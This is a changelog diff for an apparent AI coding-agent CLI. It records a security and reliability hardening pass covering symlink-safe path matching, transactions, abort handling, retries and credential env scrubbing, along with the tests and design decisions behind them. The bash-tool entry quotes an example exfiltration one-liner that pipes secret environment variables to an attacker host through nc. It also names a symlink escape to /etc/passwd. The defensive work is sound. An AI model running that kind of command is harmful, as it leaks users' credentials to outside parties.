@@ -15,6 +15,64 @@ Format:
 
 ---
 
+## [2026-04-27] M1 / Step 7 — Hardening pass
+
+Addresses the 10-issue review of M1: real reliability/security gaps caught
+before shipping. Each fix has a regression test where unit-testable.
+
+**Done:**
+- `src/storage/json-safe.ts` — `parseJsonSafe(raw, context)` + `StorageJsonError`. `messages.fromRow` and `tool_calls.fromRow` route through it so a tampered DB surfaces a typed error instead of a bare `SyntaxError` from `JSON.parse`.
+- `src/permissions/matcher.ts` — `matchPath` now realpath-resolves the target before matching. A symlink at `src/link → /etc/passwd` no longer matches the `src/**` pattern (the matcher sees `/etc/passwd` and falls out via the cwd-anchored fallback). Two regression tests cover symlink-on-file and symlink-on-directory; one pins that non-existent paths (write_file new file) still match via parent realpath.
+- `src/harness/invoke-tool.ts` — the tool_call setup (`createToolCall` + `recordApproval` + `startToolCall`/`finishToolCall`) is now wrapped in `withTransaction`. A crash between those statements no longer leaves orphan rows or stuck-pending status with a "should be denied" approval.
+- `src/harness/loop.ts` — entire loop body wrapped in `try { ... } catch (e) { return guardedFinish(e) }`. SQLite errors from `appendMessage`/etc. now produce a clean `error/providerError` exit instead of crashing the caller.
+- `src/harness/loop.ts` — wall-clock cap is now enforced *during* a step. `AbortSignal.any([callerSignal, wallClockController.signal])` composes the user's signal with a `setTimeout(..., maxWallClockMs)` controller. A hung provider/tool gets the abort signal mid-execution; provider and tools already honor the signal.
+- `src/harness/loop.ts` — the partial tool_results message persisted on `maxToolErrors` bail is now also pushed to the in-memory `messages` array, keeping the two views in sync. Footgun for any future code that reads `messages` post-bail (resume/replay).
+- `src/harness/retry.ts` — new `generateWithRetry(provider, req, opts)` wraps `provider.generate()` per CONTRACTS.md §4. Retries on 429 / 5xx / network errors with exponential backoff (200/800/3200 ms by default, 3 attempts). Refuses to retry once any event has yielded — replaying mid-stream would emit duplicates. `isRetryableError` duck-types `e.status` and `e.code` instead of importing every SDK's error class. The harness's `collectStep` call goes through this.
+- `src/tools/builtin/bash.ts` — env scrub before spawn. Strips `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_PASS`, `AWS_*`, `OPENAI_*`, `ANTHROPIC_*`, `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `GITHUB_TOKEN`/`GH_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD`. Closes the obvious `bash("env | grep KEY | nc attacker")` exfil path; not a substitute for the M2 sandbox.
+- `src/cli/output/{plain,json}.ts` — renderers now accept injectable `out`/`err` sinks so they can be unit-tested without spawning subprocesses or hijacking `process.stdout/stderr`. Plain renderer also gains `maxArgsChars` (default 200) so `tool_invoking` doesn't dump 10KB of `write_file` content into the terminal. Added `provider_event` → `error` → stderr path that the original renderer silently dropped.
+- `src/cli/run.ts` — `RunOptions.rendererOverride` and `RunOptions.errSink` test seams so end-to-end runs can be exercised without polluting process streams.
+
+**New tests:**
+- `tests/storage/json-safe.test.ts` — 1 test asserting tampered `messages.content` surfaces as `StorageJsonError` with the right context string.
+- `tests/permissions/symlink.test.ts` — 4 tests: symlink-on-file escape rejected, symlink-on-directory escape rejected, plain path still matches, write-new-file still matches via parent realpath.
+- `tests/harness/retry.test.ts` — 13 tests: `isRetryableError` matrix (429/5xx/4xx/network codes/non-Error), happy passthrough, retry-and-succeed, no-retry-after-yield, no-retry on non-retryable, exhaustion throws last error, custom sleep schedule pins backoff.
+- `tests/cli/output-plain.test.ts` — 14 tests: every event type's stdout/stderr split, args truncation, color on/off ANSI presence, deny/confirm formatting, allow silent, flush trailing newline.
+- `tests/cli/output-json.test.ts` — 3 tests: NDJSON shape, provider_event roundtrip, flush no-op.
+- `tests/cli/run.test.ts` — 8 tests: `exitCodeFor` matrix, end-to-end with mock provider for happy/exhausted/aborted/bootstrap-failure, renderer.flush invocation.
+- `tests/tools/bash.test.ts` — added 1 test asserting `ANTHROPIC_API_KEY`, `MY_TOKEN`, `AWS_SECRET_ACCESS_KEY` are scrubbed from subprocess env while non-sensitive vars pass through.
+- Total suite: **334 pass / 6 skip / 714 expect() calls** in ~1.6s. +49 tests over Step 6.
+
+**Code-review fixes folded in before commit:**
+- **Abort during provider stream now returns `interrupted/aborted` (or `interrupted/maxWallClockMs`) instead of `error/providerError`.** When the SDK throws on signal abort mid-call, the harness's `collectStep` catch now checks `signal.aborted` first and routes to the matching ExitReason. User Ctrl+C while a provider hangs gets a clean exit code 130 instead of the misleading exit code 1 with "harness: aborted" detail. Regression test pins it.
+- **New `'internalError'` exit reason** for uncaught throws in the harness path (typically SQLite errors). Was reusing `'providerError'`, which mislabeled DB errors as provider failures in the audit trail. Both still map to `error` status / exit 1; the difference is just diagnostic clarity.
+
+**Decisions:**
+- **Retry only before yield.** Retrying mid-stream would replay the partial output and produce duplicates. The common failure mode (429/connect refused) happens before any event is emitted; that's the case we cover.
+- **Retry detection is duck-typed** (`e.status`, `e.code`) not type-checked against SDK error classes. Each provider SDK has its own error hierarchy; importing all of them would couple `retry.ts` to every adapter.
+- **Realpath fallback chain** for non-existent targets: try the path itself, then `realpath(parent) + basename`. Keeps `write_file` working on new files while still catching symlinked parent dirs (the realistic escape).
+- **Wall-clock combined via `AbortSignal.any`** rather than a separate periodic check. Composing signals propagates to provider/tool naturally — they already honor the signal — so no second abort plumbing is needed.
+- **Env scrub by name pattern** rather than allowlist. Allowlist breaks every script that needs its specific env vars; deny-by-name catches the leak shape without breaking common tooling.
+- **Renderer sinks are functions, not streams.** `(s: string) => void` is trivial to test; passing a `WritableStream` would require Bun's stream API in tests. The function shape also lets us collect strings into arrays for assertions.
+- **`StorageJsonError` is a typed class** rather than a string match in messages. Lets future code differentiate corruption from logic errors.
+- **`bash` env scrub list intentionally over-broad.** Catches false positives (a legit `BUILD_TOKEN` in CI) but the failure mode is "subprocess can't see the var" which is debuggable; the alternative (under-scrub) is silent credential leakage.
+
+**Out of scope (still M2+):**
+- Sandbox proper (bwrap / sandbox-exec)
+- Trust prompt for new directories
+- Hierarchy enterprise→user→project→session permission merging
+- Cost tracking via provider token usage
+- Hooks (PreToolUse, PostToolUse)
+- Resume / replay / session picker
+- Real network integration tests for retry (requires evals harness)
+- Concurrent SQLite access stress tests (M2 with subagents)
+- DB file mode 0600 (cosmetic; doc gap)
+
+**Pending:** none.
+
+**Next:** M2 plan. Top candidates from the spec, ranked by likely pain when actually using the CLI: cost tracking + telemetry, compaction, resume from session id, plan mode, sandbox, doctor command.
+
+---
+
 ## [2026-04-27] M1 / Step 6 — One-shot CLI + harness lifecycle events (closes M1)
 
 **Done:**
